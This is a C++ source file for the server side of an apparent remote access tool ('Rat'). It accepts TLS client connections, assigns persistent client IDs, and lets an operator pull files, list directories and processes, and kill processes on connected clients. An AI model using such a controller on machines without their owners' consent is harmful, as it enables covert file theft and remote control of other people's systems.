#include "Server.hpp"
#include "Utils.hpp"
#include <iostream>
#include <thread>
#include <random>
#include <fstream>
#include <iomanip>
#include <sstream>
#include <openssl/evp.h>
#include <signal.h>
namespace Rat 
{

    // static volatile std::sig_atomic_t g_stop = 0;

    // // Xử lý tín hiệu SIGINT (Ctrl+C)
    // void signalHandler(int signum)
    // {
    //     (void)signum;
    //     g_stop = 1;
    //     exit(0);
    // }

    Server::Server(uint16_t port)
        : networkManager_(), acceptor_(networkManager_.get_io_context(), boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port))
        
    {
        networkManager_.setup_ssl_context_server("server.crt", "server.key", "ca.crt", "dh2048.pem");
        // signal(SIGINT, signalHandler);
        
    }

    Server::~Server() 
    {
        stop();
    }

    void Server::start() 
    {
        initListClientID();
        acceptConnections();
        input_thread_ = std::thread(&Server::handleUserInput, this);
        networkManager_.get_io_context().run();
    }

    void Server::stop() 
    {
        // raise(SIGINT); // temporary solution
        networkManager_.get_io_context().stop();
        {
            std::lock_guard<std::mutex> lock(client_mutex_);
            clients_.clear();
        }
        {
            std::lock_guard<std::mutex> lock(client_id_mutex_);
            client_id_.clear();
        }
        if (input_thread_.joinable()) input_thread_.join();
        
    }

    void Server::initListClientID(const std::string& path) 
    {
        std::fstream file(path, std::ios::in | std::ios::out | std::ios::app);
        if (!file.is_open()) 
        {
            std::cout << "Cannot open file: " << path << "\n";
            return;
        }
        std::string client_id;
        while (std::getline(file, client_id)) 
        {
            try 
            {
                client_id_.insert(std::stol(client_id));
            } 
            catch (const std::exception& e) 
            {
                // std::cout << "Invalid ID: " << e.what() << "\n";
            }
        }
        file.close();
    }

    void Server::acceptConnections() 
    {
        auto socket = std::make_shared<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>>(
            networkManager_.get_io_context(), networkManager_.get_ssl_context());

        acceptor_.async_accept(socket->lowest_layer(),
            [this, socket](const boost::system::error_code& ec) 
            {
                if (!ec) 
                {
                    // socket->set_verify_mode(boost::asio::ssl::verify_peer);
                    socket->async_handshake(boost::asio::ssl::stream_base::server,
                        [this, socket](const boost::system::error_code& ec) 
                        {
                            if (!ec) 
                            {
                                std::cout << "New client connected: " << socket->lowest_layer().remote_endpoint().address().to_string() << "\n";
                                handleClient(socket);
                            } 
                            else 
                            {
                                std::cout << "Handshake error: " << ec.message() << "\n";
                            }
                            boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
                            // acceptConnections();
                        });
                } 
                else 
                {
                    std::cout << "Accept error: " << ec.message() << "\n";
                    boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
                    // acceptConnections();
                }
            });
    }

    
    void Server::handleClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client) 
    {
        networkManager_.receive(client,
            [this, client](const rat::Packet& packet, const boost::system::error_code& ec) 
            {

                if (ec) 
                {
                    // std::cout << "reset GUI: " << std::endl;
                    ServerGUI::resetHeaderDisplayed();
                    std::cout << "Client error: " << ec.message() << "\n";
                    client->lowest_layer().close();
                    removeClient(client);
                    uint64_t client_id = -1;
                    {
                        auto client_id_it = clients_.find(client);
                        if(client_id_it != clients_.end())
                        {
                            client_id = client_id_it->second;
                        }
                    }
                    // free file receiver
                    {
                        std::lock_guard<std::mutex> lock(file_receivers_mutex_);
                        file_receivers_.erase(client_id); 
                        
                    }
                    std::cout << "reset GUI: " << std::endl;
                    ServerGUI::resetHeaderDisplayed();
                    return;
                }
                if (packet.has_chunked_data()) 
                {
                    
                    switch (packet.type())
                    {
                        case rat::Packet::STATIC_ID:
                        {
                            
                            uint64_t source_id = parseStaticIdPayload(packet.chunked_data().payload());
                            if (client_id_.find(source_id) != client_id_.end()) 
                            {   
                                updateClientWithExistingId(client, source_id);
                                // std::cout << "Debug update: " << source_id << std::endl;
                            } 
                            else 
                            {
                                assignNewClientId(client, source_id);
                                saveClientIdsToFile(source_id);
                                // std::cout << "Debug assign: " << source_id << std::endl;
                            }
                            
                            boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
                            break;
                        }
                        case rat::Packet::TRANSFER_FILE:
                        {
                            // std::cout << "TRANSFER FILE TYPE FROM SERVER: "  << packet.type() << std::endl;
                            // std::cout << "TRANSFER FILE PAYLOAD FROM SERVER: " << packet.chunked_data().sequence_number() + 1 << " / "
                            //         << packet.chunked_data().total_chunks() << " = "
                            //         << (packet.chunked_data().sequence_number() + 1) / float(packet.chunked_data().total_chunks()) * 100 << "%" << std::endl;
                            uint64_t client_id;
                            std::string ip_id;
                            {
                                std::lock_guard<std::mutex> lock(file_receivers_mutex_);
                                auto client_it = clients_.find(client);
                                if (client_it == clients_.end()) 
                                {
                                    std::cerr << "[" << std::time(nullptr) << "] Unknown client sending TRANSFER_FILE\n";
                                    break;
                                }
                                client_id = client_it->second;
                                ip_id = client->lowest_layer().remote_endpoint().address().to_string();
                            }
                            auto receiver_it = file_receivers_.find(client_id);
                            if (receiver_it == file_receivers_.end()) 
                            {
                                std::string file_path = Utils::sanitizeFileName(packet.chunked_data().data_id()) + "_" + std::to_string(client_id) + Utils::getFileName(packet.file_path());
                                std::string filename = Utils::getFileName(packet.file_path());
                                auto receiver = std::make_shared<FileReceiver>(
                                    client, networkManager_, file_path, packet.chunked_data().data_id(), client_id,
                                    [this, client_id, client]() 
                                    {
                                        {
                                            std::lock_guard<std::mutex> lock(file_receivers_mutex_);
                                            file_receivers_.erase(client_id);
                                        }
                                
                                        handleClient(client);
                                    }, 
                                    [this, client_id, ip_id, filename](uint64_t sequence_number, uint64_t total_chunks) 
                                    {
                                        ServerGUI::displayProgress(client_id, ip_id, filename, sequence_number, total_chunks);
                                    });

                                
                                file_receivers_[client_id] = receiver;
                                receiver->startReceiving(packet);
                            } 
                            else 
                            {
                                // std::cout << "debug find id " << std::endl;
                                receiver_it->second->startReceiving(packet);
                            }

                            return; // FileReceiver continue solve packet
                        }
                        case rat::Packet::LIST_FILES_FOLDERS:
                        {   
                            // std::cout << "TRANSFER FILE TYPE FROM SERVER: "  << packet.type() << std::endl;
                            // std::cout << "TRANSFER FILE PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
                            uint64_t client_id;
                            std::string ip_id;
                            std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client_copy;
                            {
                                std::lock_guard<std::mutex> lock(client_mutex_);
                                auto client_it = clients_.find(client);
                                if (client_it == clients_.end())
                                {
                                    std::cerr << "[" << std::time(nullptr) << "] Unknown client sending LIST_FILES_FOLDERS\n";
                                    break;
                                }
                                client_id = client_it->second;
                                ip_id = client->lowest_layer().remote_endpoint().address().to_string();
                                client_copy = client;
                            }

                          
                            {
                                std::lock_guard<std::mutex> lock(process_handlers_mutex_);
                                if (!process_handlers_.empty() || !file_folder_handlers_.empty()) 
                                {
                                    std::cout << "[" << std::time(nullptr) << "] A file/folder list is already being handled. Skipping.\n";
                                    break;
                                }
                            }

                            auto handler_it = file_folder_handlers_.find(client_id);
                            if (handler_it == file_folder_handlers_.end())
                            {
                                auto handler = std::make_shared<FilesFoldersHandler>( 
                                    client_copy, networkManager_, client_id, packet.chunked_data().data_id(),
                                    [this, client_id, ip_id, client_copy](const std::string& file_folder_list)
                                    {
                                        // std::cout << "debug data file and folder receive: " << file_folder_list << std::endl;
                                        ServerGUI::displayFileFolderList(client_id, ip_id, file_folder_list); 
                                        {
                                            std::lock_guard<std::mutex> lock(file_folder_handlers_mutex_); 
                                            file_folder_handlers_.erase(client_id);
                                        }
                                        if (client_copy && client_copy->lowest_layer().is_open())
                                        {
                                            boost::asio::post(networkManager_.get_io_context(), [this, client_copy]() { handleClient(client_copy); });
                                        }
                                    });

                                {
                                    std::lock_guard<std::mutex> lock(file_folder_handlers_mutex_);
                                    file_folder_handlers_[client_id] = handler;
                                }
                                handler->startReceiving(packet);
                            }
                            else
                            {
                                handler_it->second->startReceiving(packet);
                            }
                            return;
                        }
                        case rat::Packet::LIST_PROCESSES:
                        {
                            uint64_t client_id;
                            std::string ip_id;
                            std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client_copy;
                            {
                                std::lock_guard<std::mutex> lock(client_mutex_);
                                auto client_it = clients_.find(client);
                                if (client_it == clients_.end())
                                {
                                    std::cerr << "[" << std::time(nullptr) << "] Unknown client sending LIST_PROCESSES\n";
                                    break;
                                }
                                client_id = client_it->second;
                                ip_id = client->lowest_layer().remote_endpoint().address().to_string();
                                client_copy = client; 
                            }

                            {
                                std::lock_guard<std::mutex> lock(process_handlers_mutex_);
                                if (!process_handlers_.empty())
                                {
                                    std::cout << "[" << std::time(nullptr) << "] A process list is already being handled for another client. Skipping.\n";
                                    break;
                                }
                            }

                            auto handler_it = process_handlers_.find(client_id);
                            if (handler_it == process_handlers_.end())
                            {
                                auto handler = std::make_shared<ProcessHandler>(
                                    client_copy, networkManager_, client_id, packet.chunked_data().data_id(),
                                    [this, client_id, ip_id, client_copy](const std::string& process_list)
                                    {
                                        ServerGUI::displayProcessList(client_id, ip_id, process_list);
                                        {
                                            std::lock_guard<std::mutex> lock(process_handlers_mutex_);
                                            process_handlers_.erase(client_id);
                                        }
                                        if (client_copy && client_copy->lowest_layer().is_open())
                                        {
                                            boost::asio::post(networkManager_.get_io_context(), [this, client_copy]() { handleClient(client_copy); });
                                        }
                                    });

                                {
                                    std::lock_guard<std::mutex> lock(process_handlers_mutex_);
                                    process_handlers_[client_id] = handler;
                                }
                                handler->startReceiving(packet);
                            }
                            else
                            {
                                handler_it->second->startReceiving(packet);
                            }
                            return; // ProcessHandler will automatically call handleClient when done
                            break;
                        }
                        default:
                        {
                            boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
                            break;
                        }
                    }                    
                }
                
            });
    }

    void Server::sendCommandToClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, const rat::Packet& packet) 
    {
        networkManager_.send(client, packet, [](const boost::system::error_code& ec) 
        {
            if (ec) std::cout << "Send error: " << ec.message() << "\n";
        });
    }

    void Server::handleUserInput() 
    {
        std::string input;
        while (true) 
        {
            std::getline(std::cin, input);
            // if (input == "exit")
            // {
            //     stop();
            //     break;
            // }
            std::vector<std::string> list_commands = Utils::handleCommand(input);
            if(list_commands.size() == 3)
            {
                std::string command = list_commands[0];
                std::string object = list_commands[1];
                std::string argument = list_commands[2];
                // transfer_file 127.0.0.1/0 /home/quang/Downloads/ubuntu.txt
                // argument = "/home/quang/Downloads/ubuntu.iso";
                uint64_t object_id = parseStaticIdPayload(object);
                std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket_client = Utils::getSocketFromId(clients_, object_id);
                // O(n) => optimizer in the furture 
                if(!socket_client) continue;
                if (command == "transfer_file")
                {
                    // std::cout << "Debug transfer_file argument: " << argument << std::endl;
                    rat::Packet packet_transfer_file;
                    packet_transfer_file.set_type(rat::Packet::TRANSFER_FILE);
                    packet_transfer_file.set_packet_id("client_" + std::to_string(object_id) + "_" + Utils::getCurrentTimeString());
                    packet_transfer_file.set_source_id("server_0");
                    packet_transfer_file.set_destination_id("client_" + std::to_string(object_id));
                    packet_transfer_file.set_encrypted(true);
                    packet_transfer_file.set_file_path(argument);
                    auto* chunked = packet_transfer_file.mutable_chunked_data();
                    chunked->set_data_id("TRANSFER_FILE" + Utils::getCurrentTimeString() + std::to_string(object_id));
                    chunked->set_sequence_number(0);
                    chunked->set_total_chunks(1);
                    chunked->set_payload(command);
                    chunked->set_success(true);
                    // std::cout << "debug packet transfer: " << packet_transfer_file.file_path() << std::endl;
                    networkManager_.send(socket_client, packet_transfer_file, [](const boost::system::error_code& ec) 
                    {
                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
                    });
                }
                else if (command == "list_files_folders")
                {
                    rat::Packet packet_list_files_folders;
                    packet_list_files_folders.set_type(rat::Packet::LIST_FILES_FOLDERS);
                    packet_list_files_folders.set_packet_id("client_" + std::to_string(object_id) + "_" + Utils::getCurrentTimeString());
                    packet_list_files_folders.set_source_id("server_0");
                    packet_list_files_folders.set_destination_id("client_" + std::to_string(object_id));
                    packet_list_files_folders.set_encrypted(true);
                    
                    auto* chunked = packet_list_files_folders.mutable_chunked_data();
                    chunked->set_data_id("LIST_FILES_FOLDERS" + Utils::getCurrentTimeString() + std::to_string(object_id));
                    chunked->set_sequence_number(0);
                    chunked->set_total_chunks(1);
                    chunked->set_payload(argument);
                    chunked->set_success(true);
                    networkManager_.send(socket_client, packet_list_files_folders, [](const boost::system::error_code& ec) 
                    {
                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
                    });
                }
                else if (command == "kill_process")
                {
                    rat::Packet packet_kill_process;
                    packet_kill_process.set_type(rat::Packet::KILL_PROCESS);
                    packet_kill_process.set_packet_id("client_" + std::to_string(object_id) + "_" + Utils::getCurrentTimeString());
                    packet_kill_process.set_source_id("server_0");
                    packet_kill_process.set_destination_id("client_" + std::to_string(object_id));
                    packet_kill_process.set_encrypted(true);
                    
                    auto* chunked = packet_kill_process.mutable_chunked_data();
                    chunked->set_data_id("KILL_PROCESS" + Utils::getCurrentTimeString() + std::to_string(object_id));
                    chunked->set_sequence_number(0);
                    chunked->set_total_chunks(1);
                    chunked->set_payload(argument);
                    chunked->set_success(true);
                    networkManager_.send(socket_client, packet_kill_process, [](const boost::system::error_code& ec) 
                    {
                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
                    });
                }
                else 
                {
                    ServerGUI::displayMenu();
                }
            }
            else if (list_commands.size() == 1)
            {
                std::string command = list_commands[0];
                if (command == "list_files_folders") 
                {
                    std::cout << "server send: " << command << std::endl;
                    rat::Packet packet;
                    packet.set_type(rat::Packet::LIST_FILES_FOLDERS);
                    packet.set_packet_id("client_all_" + Utils::getCurrentTimeString());
                    packet.set_source_id("server_0");
                    packet.set_destination_id("client_all");
                    packet.set_encrypted(true);
                    packet.set_file_path("");
                    auto* chunked = packet.mutable_chunked_data();
                    chunked->set_data_id("LIST_FILES_FOLDERS" + Utils::getCurrentTimeString() + "all");
                    chunked->set_sequence_number(0);
                    chunked->set_total_chunks(1);
                    chunked->set_payload(command);
                    chunked->set_success(true);
                    for (auto& client : clients_) 
                    {
                        if (client.first && client.first->lowest_layer().is_open()) {
                            sendCommandToClient(client.first, packet);
                        } else {
                            std::cout << "[" << std::time(nullptr) << "] Skipping closed socket for client with id: " << client.second << "\n";
                        }
                        // sendCommandToClient(client.first, packet);
                    }
                }
                else 
                {
                    ServerGUI::displayMenu();
                }
            }
            else if (list_commands.size() == 2)
            {
                std::string command = list_commands[0];
                std::string object = list_commands[1];
                uint64_t object_id = parseStaticIdPayload(object);
                std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket_client = Utils::getSocketFromId(clients_, object_id);
                if(!socket_client) continue;
                
                if(command == "list_processes")
                {
                    rat::Packet packet_list_processes;
                    packet_list_processes.set_type(rat::Packet::LIST_PROCESSES);
                    packet_list_processes.set_packet_id("client_" + std::to_string(object_id) + "_" + Utils::getCurrentTimeString());
                    packet_list_processes.set_source_id("server_0");
                    packet_list_processes.set_destination_id("client_" + std::to_string(object_id));
                    packet_list_processes.set_encrypted(true);
                    
                    auto* chunked = packet_list_processes.mutable_chunked_data();
                    chunked->set_data_id("LIST_PROCESSES" + Utils::getCurrentTimeString() + std::to_string(object_id));
                    chunked->set_sequence_number(0);
                    chunked->set_total_chunks(1);
                    chunked->set_payload(command);
                    chunked->set_success(true);
                    networkManager_.send(socket_client, packet_list_processes, [](const boost::system::error_code& ec) 
                    {
                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
                    });
                }
                else 
                {
                    ServerGUI::displayMenu();
                }
                
            }
            else 
            {
                ServerGUI::displayMenu();
            }
        }
    }

    void Server::addClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, uint64_t client_id) 
    {
        std::lock_guard<std::mutex> lock(client_mutex_);
        if (clients_.size() >= MAX_CLIENT) 
        {
            std::cout << "Error: Maximum client limit reached!\n";
            if (client) client->lowest_layer().close();
            return;
        }
        clients_[client] = client_id;
        // clients_.insert({client, client_id});
    }

    void Server::removeClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client) 
    {
        std::lock_guard<std::mutex> lock(client_mutex_);
        clients_.erase(client);
    }

    uint64_t Server::parseStaticIdPayload(const std::string& payload) 
    {
        try 
        {
            return std::stol(payload);
        } 
        catch (const std::exception& e) 
        {
            // std::cout << "Invalid number: " << e.what() << "\n";
            return -1;
        }
    }

    void Server::updateClientWithExistingId(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, uint64_t source_id) 
    {
        std::lock_guard<std::mutex> lock(client_mutex_);
        if (clients_.find(client) != clients_.end()) 
        {
            std::cout << "Client is existing, update ID: " << source_id << "\n";
            clients_[client] = source_id;
        } 
        else 
        {
            // clients_.insert({client, source_id});
            clients_[client] = source_id;
        }
    }

    void Server::assignNewClientId(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, uint64_t& source_id) 
    {
        {
            std::lock_guard<std::mutex> lock(client_id_mutex_);
            source_id = client_id_.empty() ? 0 : *client_id_.rbegin() + 1;
            client_id_.insert(source_id);
        }

        rat::Packet response;
        response.set_type(rat::Packet::STATIC_ID);
        response.set_packet_id("server_0_" + Utils::getCurrentTimeString());
        response.set_source_id("server_0");
        response.set_destination_id("client_" + std::to_string(source_id));
        response.set_encrypted(true);
        auto* chunked = response.mutable_chunked_data();
        chunked->set_data_id("STATIC_ID_" + Utils::getCurrentTimeString() + std::to_string(source_id));
        chunked->set_sequence_number(0);
        chunked->set_total_chunks(1);
        chunked->set_payload(std::to_string(source_id));
        chunked->set_success(true);

        sendCommandToClient(client, response);
        {
            std::lock_guard<std::mutex> lock(client_mutex_);
            // std::cout << "Debug: " << source_id << std::endl;
            // std::cout << "Debug set clients before insert: ";
            for(auto x: clients_) { std::cout << x.first << "-" << x.second << std::endl;}
            // clients_.insert({client, source_id});
            clients_[client] = source_id;
            // std::cout << "Debug set clients after insert: ";
            for(auto x: clients_) {std::cout << x.first << "-" << x.second << std::endl;}
        }
    }

    void Server::saveClientIdsToFile(const uint64_t& source_id, const std::string& path) 
    {
        boost::asio::post(networkManager_.get_io_context(), [this, source_id, path]() 
        {
            std::lock_guard<std::mutex> lock(file_save_mutex_);
            std::ofstream file(path, std::ios::app);
            if (!file.is_open()) 
            {
                std::cout << "Cannot open file: " << path << "\n";
                return;
            }
            file << source_id << "\n";
            file.close();
        });
    }

} // namespace Rat